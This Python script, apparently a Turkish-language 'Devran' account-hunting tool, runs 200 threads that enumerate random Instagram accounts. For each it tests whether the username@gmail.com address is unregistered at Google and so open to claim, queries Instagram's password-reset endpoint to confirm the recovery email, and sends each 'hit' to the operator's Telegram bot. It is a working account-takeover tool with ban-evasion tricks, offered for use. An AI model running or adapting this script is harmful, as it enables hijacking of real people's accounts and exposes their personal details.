+import os
from random import choice, randrange
import sys
import re
import json
import string
import random
import hashlib
import uuid
import time
from datetime import datetime
from threading import Thread, Timer
import requests
from requests import post as pp
from user_agent import generate_user_agent
from random import choice, randrange
from cfonts import render, say
from colorama import Fore, Style, init
import gzip
import brotli
import secrets
import httpx
from urllib.parse import urlencode

init(autoreset=True)


INSTAGRAM_RECOVERY_URL = 'https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/'
IG_SIG_KEY_VERSION = 'ig_sig_key_version'
SIGNED_BODY = 'signed_body'
COOKIE_VALUE = 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj'
CONTENT_TYPE_HEADER = 'Content-Type'
COOKIE_HEADER = 'Cookie'
USER_AGENT_HEADER = 'User-Agent'
DEFAULT_USER_AGENT = ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                      'AppleWebKit/537.36 (KHTML, like Gecko) '
                      'Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0')

GOOGLE_ACCOUNTS_URL = 'https://accounts.google.com'
GOOGLE_ACCOUNTS_DOMAIN = 'accounts.google.com'
REFERRER_HEADER = 'referer'
ORIGIN_HEADER = 'origin'
AUTHORITY_HEADER = 'authority'
CONTENT_TYPE_FORM = 'application/x-www-form-urlencoded; charset=UTF-8'
CONTENT_TYPE_FORM_ALT = 'application/x-www-form-urlencoded;charset=UTF-8'

TOKEN_FILE = 'tl.txt'
devran_domain = '@gmail.com' 

total_hits = 0
hits = 0
bad_insta = 0
bad_email = 0
good_ig = 0
infoinsta = {}

header = render('DEVRAN', colors=['white', 'white'], align='center')
print(header)
ID = input("ID Gir:")
TOKEN = input("Token Gir:")

print(f"""
1 - 2012
2 - 2013
3 - 2014
4 - 2015
5 - 2016
6 - 2017
7 - 2018
8 - 2019
9 - 2020
""")

devransecim = input("1/9: ")

if devransecim == "1":
    bbk = 210468786
    id_upper = 269736186
elif devransecim == "2":
    bbk = 310438486
    id_upper = 495999999
elif devransecim == "3":
    bbk = 1219010000
    id_upper = 1429010000
elif devransecim == "4":
    bbk = 1700000000
    id_upper = 2400000000
elif devransecim == "5":
    bbk = 3313668786
    id_upper = 3713668786
elif devransecim == "6":
    bbk = 5398785217
    id_upper = 5999785217
elif devransecim == "7":
    bbk = 7497939245
    id_upper = 8597939245
elif devransecim == "8":
    bbk = 11254029834
    id_upper = 21254029834
elif devransecim == "9":
    bbk = 40064475395
    id_upper = 43464475395

os.system('clear')

def pppp():
    ge = hits               
    bt = bad_insta + bad_email 
    be = good_ig          
    print(f"\r Hits: {ge}  |  Bad İnsta: {bt}  |  Good: {be}   ", end='', flush=True)

def update_stats():
    pppp()

def devrankurucu():
    try:
        alphabet = 'azertyuiopmlkjhgfdsqwxcvbn'
        n1 = ''.join(choice(alphabet) for _ in range(randrange(6, 9)))
        n2 = ''.join(choice(alphabet) for _ in range(randrange(3, 9)))
        host = ''.join(choice(alphabet) for _ in range(randrange(15, 30)))
        headers = {
            'accept': '*/*',
            'accept-language': 'ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6',
            CONTENT_TYPE_HEADER: CONTENT_TYPE_FORM_ALT,
            'google-accounts-xsrf': '1',
            USER_AGENT_HEADER: str(generate_user_agent())
        }
        recovery_url = (f"{GOOGLE_ACCOUNTS_URL}/signin/v2/usernamerecovery"
                        "?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB")
        res1 = requests.get(recovery_url, headers=headers)
        tok = re.search(
            'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',
            res1.text
        ).group(2)
        cookies = {'__Host-GAPS': host}
        headers2 = {
            AUTHORITY_HEADER: GOOGLE_ACCOUNTS_DOMAIN,
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            CONTENT_TYPE_HEADER: CONTENT_TYPE_FORM_ALT,
            'google-accounts-xsrf': '1',
            ORIGIN_HEADER: GOOGLE_ACCOUNTS_URL,
            REFERRER_HEADER: ('https://accounts.google.com/signup/v2/createaccount'
                              '?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn'),
            USER_AGENT_HEADER: generate_user_agent()
        }
        data = {
            'f.req': f'["{tok}","{n1}","{n2}","{n1}","{n2}",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
            'deviceinfo': ('[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,'
                           'null,0,1,"",null,null,2,2]')
        }
        response = requests.post(f"{GOOGLE_ACCOUNTS_URL}/_/signup/validatepersonaldetails",
                                 cookies=cookies, headers=headers2, data=data)
        token_line = str(response.text).split('",null,"')[1].split('"')[0]
        host = response.cookies.get_dict()['__Host-GAPS']
        with open(TOKEN_FILE, 'w') as f:
            f.write(f"{token_line}//{host}\n")
    except Exception as e:
        print(e)
        devrankurucu()

devrankurucu()        

def check_gmail(email):
    global bad_email, hits
    try:
        if '@' in email:
            email = email.split('@')[0]
        with open(TOKEN_FILE, 'r') as f:
            token_data = f.read().splitlines()[0]
        tl, host = token_data.split('//')
        cookies = {'__Host-GAPS': host}
        headers = {
            AUTHORITY_HEADER: GOOGLE_ACCOUNTS_DOMAIN,
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            CONTENT_TYPE_HEADER: CONTENT_TYPE_FORM_ALT,
            'google-accounts-xsrf': '1',
            ORIGIN_HEADER: GOOGLE_ACCOUNTS_URL,
            REFERRER_HEADER: f"https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&TL={tl}",
            USER_AGENT_HEADER: generate_user_agent()
        }
        params = {'TL': tl}
        data = (f"continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn"
                f"&f.req=%5B%22TL%3A{tl}%22%2C%22{email}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D"
                "&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false"
                "&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22"
                "%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D"
                "&gmscoreversion=undefined&flowName=GlifWebSignIn&")
        response = pp(f"{GOOGLE_ACCOUNTS_URL}/_/signup/usernameavailability",
                      params=params, cookies=cookies, headers=headers, data=data)
        if '"gf.uar",1' in response.text:
            hits += 1
            update_stats()
            full_email = email + devran_domain
            username, domain = full_email.split('@')
            InfoAcc(username, domain)
        else:
            bad_email += 1
            update_stats()
    except Exception:
        pass


def check_instagram_email(email):
    global good_ig, bad_insta
    try:
        url = "https://i.instagram.com/api/v1/users/check_email/"
        
        with httpx.Client(http2=True, timeout=30) as client:
            response = client.post(
                url, 
                data=f"email={email}",
                headers={
                    'User-Agent': "Instagram 166.0.0.30.120 Android (30/11; 1440dpi; 2560x1440; samsung; SM-G973F; x86_64; tablet; en_US; kirin)",
                    'Content-Type': "application/x-www-form-urlencoded; charset=UTF-8"
                }
            )
        
        result = response.json()
        
        if result.get("available") == False or result.get("taken") == True:
            if devran_domain in email:
                check_gmail(email)
            good_ig += 1
            update_stats()
            return True
        else:
            bad_insta += 1
            update_stats()
            return False
            
    except Exception as e:
        bad_insta += 1
        update_stats()
        return False


def reset_api(user):
    try:
        BASE_URL = "https://www.instagram.com"
        RESET_URL = "https://www.instagram.com/accounts/password/reset/"
        SEND_AJAX_URL = "https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/"
        UA_WEB = ("Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 "
                  "(KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36")
        UA_APP = ("Instagram 320.0.0.34.109 Android (33/13; 420dpi; 1080x2340; "
                  "samsung; SM-A546B; a54x; exynos1380; tr_TR; 465123678)")
        
        with httpx.Client(http2=True, follow_redirects=True, timeout=30) as client:
            r0 = client.get(BASE_URL, headers={
                "User-Agent": UA_WEB,
                "Accept": "text/html,application/xhtml+xml,*/*;q=0.9",
                "Accept-Language": "tr-TR,tr;q=0.9",
                "sec-fetch-dest": "document",
                "sec-fetch-mode": "navigate",
                "sec-fetch-site": "none",
            })
            
            csrf = ""
            for c in client.cookies.jar:
                if c.name == "csrftoken":
                    csrf = c.value
                    break
            
            if not csrf:
                return "CSRF token alınamadı"
            
            headers = {
                "User-Agent": UA_APP,
                "Accept": "*/*",
                "Accept-Language": "tr-TR,tr;q=0.9",
                "Accept-Encoding": "gzip, deflate, br",
                "Content-Type": "application/x-www-form-urlencoded",
                "Origin": BASE_URL,
                "Referer": RESET_URL,
                "X-CSRFToken": csrf,
                "X-IG-App-ID": "936619743392459",
                "X-Requested-With": "XMLHttpRequest",
                "X-Instagram-AJAX": "1",
                "X-ASBD-ID": "129477",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
            }
            
            data = urlencode({"email_or_username": user})
            r = client.post(SEND_AJAX_URL, content=data.encode(), headers=headers)
            result = r.json()
            
            status = result.get("status", "")
            if status == "ok":
                contact_point = result.get("contact_point", result.get("obfuscated_email", result.get("masked_email", "Email bulunamadı")))
                return contact_point
            elif status == "fail":
                return f"Başarısız: {result.get('message', '')}"
            else:
                return f"Bilinmeyen yanıt: {result}"
                
    except Exception as e:
        return f'Hata: {str(e)}'
    

def get_register_date(user_id):
    try:
        user_id_int = int(user_id)
        
        if 1 < user_id_int <= 1278889:
            return 2010
        elif 1279000 <= user_id_int <= 17750000:
            return 2011
        elif 17750001 <= user_id_int <= 279760000:
            return 2012
        elif 279760001 <= user_id_int <= 900990000:
            return 2013
        elif 900990001 <= user_id_int <= 1629010000:
            return 2014
        elif 1629010001 <= user_id_int <= 2369359761:
            return 2015
        elif 2369359762 <= user_id_int <= 4239516754:
            return 2016
        elif 4239516755 <= user_id_int <= 6345108209:
            return 2017
        elif 6345108210 <= user_id_int <= 10016232395:
            return 2018
        elif 10016232396 <= user_id_int <= 27238602159:
            return 2019
        elif 27238602160 <= user_id_int <= 43464475395:
            return 2020
        elif 43464475396 <= user_id_int <= 50289297647:
            return 2021
        elif 50289297648 <= user_id_int <= 57464707082:
            return 2022
        elif 57464707083 <= user_id_int <= 63313426938:
            return 2023
        else:
            return "2024 - 2025"
    except:
        return "? "


def InfoAcc(username, domain):
    global total_hits
    account_info = infoinsta.get(username, {})
    user_id = account_info.get('pk')
    full_name = account_info.get('full_name')
    followers = account_info.get('follower_count', 0)
    following = account_info.get('following_count')
    posts = account_info.get('media_count')
    acem = account_info.get('is_private')
    bio = account_info.get('biography')
    
    if followers > 1 and posts > 0:
        meta_durum = "ok"
    else:
        meta_durum = "x"
    
    is_category = account_info.get('is_category', False)
    category_name = account_info.get('category_name', '')
    
    if is_category or category_name:
        business_durum = "ok"
    else:
        business_durum = "x"
    
    total_hits += 1
    
    reset_result = reset_api(username)
    rest_display = reset_result
    
    if user_id:
        tarih = get_register_date(user_id)
    else:
        tarih = "Bilinmiyor"
    
    info_text = f"""
==========Devran==========
Hits: {total_hits}
İsim: {full_name}
Kullanıcı Adı: @{username}
Email: {username}@gmail.com
Takipçi: {followers}
Takip: {following}
Post: {posts}
Bio: {bio}
Tarih: {tarih}
Gizli: {acem}
Meta(Tahmini): {meta_durum}
Business: {business_durum}
Reset: {rest_display}
Link: instagram.com/{username}
==========Enart==========
Dev -  @D3vran
"""
    
    print(info_text)
    
    with open('instagramhits.txt', 'a', encoding='utf-8') as f:
        f.write(info_text)
    
    try:
        requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&text={info_text}")
    except Exception:
        pass

def rand_ids(min_id, max_id):
    return random.randint(min_id, max_id)  


def devran_thread():
    global bbk, id_upper
    while True:
        try:
            # Daha stabil ve çeşitli User-Agent
            rnd = str(random.randint(2500000000, 21254029834))
            
            android_versions = ["23/6.0", "24/7.0", "25/7.1.1", "26/8.0", "27/8.1", "28/9.0"]
            manufacturers = ["SAMSUNG", "HUAWEI", "LGE/lge", "HTC", "ASUS", "ZTE", 
                             "ONEPLUS", "XIAOMI", "OPPO", "VIVO", "SONY", "REALME"]

            user_agent = (
                f"Instagram 311.0.0.32.118 Android ({random.choice(android_versions)}; "
                f"{random.randint(100, 1300)}dpi; "
                f"{random.randint(200, 2000)}x{random.randint(200, 2000)}; "
                f"{random.choice(manufacturers)}; SM-T{rnd}; SM-T{rnd}; qcom; en_US; "
                f"545986{random.randint(111,999)})"
            )

            Id = rand_ids(bbk, id_upper)

            lsd = ''.join(random.choices(
                'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', 
                k=16
            ))

            headers = {
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://www.instagram.com',
                'referer': 'https://www.instagram.com/',
                'user-agent': user_agent,
                'x-fb-friendly-name': 'PolarisUserHoverCardContentV2Query',
                'x-fb-lsd': lsd,
            }

            data = {
                'lsd': lsd,
                'fb_api_caller_class': 'RelayModern',
                'fb_api_req_friendly_name': 'PolarisUserHoverCardContentV2Query',
                'variables': json.dumps({
                    "userID": str(Id),
                    "username": "cristiano"
                }),
                'server_timestamps': 'true',
                'doc_id': '7717269488336001',
            }

            response = requests.post(
                'https://www.instagram.com/api/graphql', 
                headers=headers, 
                data=data,
                timeout=12
            )

            if response.status_code != 200:
                time.sleep(random.uniform(0.8, 2.0))
                continue

            json_data = response.json()
            user_data = json_data.get('data', {}).get('user', {})

            if not user_data or not user_data.get('username'):
                continue

            username = user_data.get('username')
            infoinsta[username] = user_data

            # Filtre
            followers = user_data.get('follower_count', 0)
            posts = user_data.get('media_count', 0)

            if followers >= 0 and posts >= 0:
                email = username + devran_domain
                check_instagram_email(email)

        except Exception:
            # Sessiz tutmak istiyorsan pass, log istiyorsan aç
            pass

        # Daha az agresif bekleme → ban riskini azaltır
        time.sleep(random.uniform(0.6, 1.8))

def stats_loop():
    while True:
        update_stats()
        time.sleep(1)

Thread(target=stats_loop, daemon=True).start()

for _ in range(200):
    Thread(target=devran_thread).start()

while True:
    time.sleep(1)